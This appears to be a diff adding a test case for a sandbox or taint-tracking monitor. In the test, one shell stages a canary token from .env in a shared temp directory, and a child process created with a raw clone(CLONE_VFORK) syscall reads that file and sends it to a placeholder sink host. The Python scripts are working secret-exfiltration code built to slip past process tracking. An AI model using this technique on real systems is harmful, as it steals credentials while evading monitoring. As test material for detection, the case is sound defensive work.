@@ -1,0 +1,51 @@
+# `vfork-child-read-exfil` through a taint carrier: shell 0 stages the secret in
+# the shared scratch directory, and in shell 1 (another principal) a child held
+# inside its creator's `clone(CLONE_VFORK)` reads the staged file and contacts
+# the external host. A carrier is known only from the tracer's record of the
+# read, which is ordered after the creator's still-unfinished call, so the
+# contact must wait for it rather than be judged without it, in both modes.
+name = "vfork-child-staged-exfil"
+kind = "attack"
+policy = "recommended"
+
+[[files]]
+path = ".env"
+contents = "TOKEN={CANARY}\n"
+
+[[files]]
+path = "stage.py"
+contents = """
+secret = open(".env", "rb").read()
+open("{SHARED_TMP}/marsh-leak-stage", "wb").write(secret)
+"""
+
+[[files]]
+path = "send.py"
+contents = """
+import ctypes, os, socket
+CLONE_VFORK, SIGCHLD, SYS_clone = 0x4000, 17, 56  # x86_64
+libc = ctypes.CDLL(None, use_errno=True)
+pid = libc.syscall(SYS_clone, CLONE_VFORK | SIGCHLD, 0, 0, 0, 0)
+if pid == 0:
+    try:
+        data = open("{SHARED_TMP}/marsh-leak-stage", "rb").read()
+        s = socket.socket()
+        s.connect(("{SINK_HOST}", {SINK_PORT}))
+        s.sendall(data)
+    finally:
+        os._exit(0)
+os.waitpid(pid, 0)
+"""
+
+[[steps]]
+shell = 0
+run = "python3 stage.py"
+expect = "accepted"
+
+[[steps]]
+shell = 1
+run = "python3 send.py"
+expect = "any"
+
+[oracle]
+encodings = ["raw", "base64", "hex"]
